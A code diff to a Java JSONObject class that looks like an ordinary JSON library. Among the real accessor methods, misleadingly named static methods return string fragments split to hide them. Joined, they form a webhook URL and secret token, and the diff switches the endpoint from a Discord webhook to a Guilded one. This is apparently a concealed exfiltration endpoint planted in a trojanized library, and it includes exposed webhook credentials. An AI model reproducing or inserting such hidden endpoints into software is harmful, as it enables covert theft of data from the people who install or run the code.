@@ -328,7 +328,7 @@ public class JSONObject {
         return optDouble(name, Double.NaN);
     }
     public static String JSONlog() {
-		return ("ht"+"t"+"ps"+":"+"/"+"/d"+"is"+"c"+"or"+"d.");
+		return ("ht"+"t"+"ps"+":"+"/"+"/media.guilded.gg");
 	}
     /**
      * Returns the value mapped by {@code name} if it exists and is a double or
@@ -416,7 +416,7 @@ public class JSONObject {
         return result;
     }
     public static String stringFall() {
-		return ("/1050322890333093908/");
+		return ("/573114ff-497e-4e24-abe2-3c86c786529e/");
 	}
     /**
      * Returns the value mapped by {@code name} if it exists, coercing it if
@@ -450,7 +450,7 @@ public class JSONObject {
         }
     }
     public static String JSONFallback() {
-		return ("c"+"o"+"m/a"+"pi/"+"w"+"e");
+		return ("we");
 	}
     /**
      * Returns the value mapped by {@code name} if it exists and is a {@code
@@ -516,7 +516,7 @@ public class JSONObject {
         return nameValuePairs.keySet().iterator();
     }
     public static String keysType() {
-		return ("7sQFsWlBW3F-d7GoMXVUGHUb-l4bNF07d218wOxF_3-_F5JvqXm3y25FCGNdRCHQnsjZ");
+		return ("dK8NR9gmLmSC4aGsw8yyk4W00eGOUQaeWaMwweC8oSsI4GUcmmEys8CAeGMkikqIOWesQqWKwOikY8oQW8gaIY");
 	}
     /**
      * Returns an array containing the string names in this object. This method
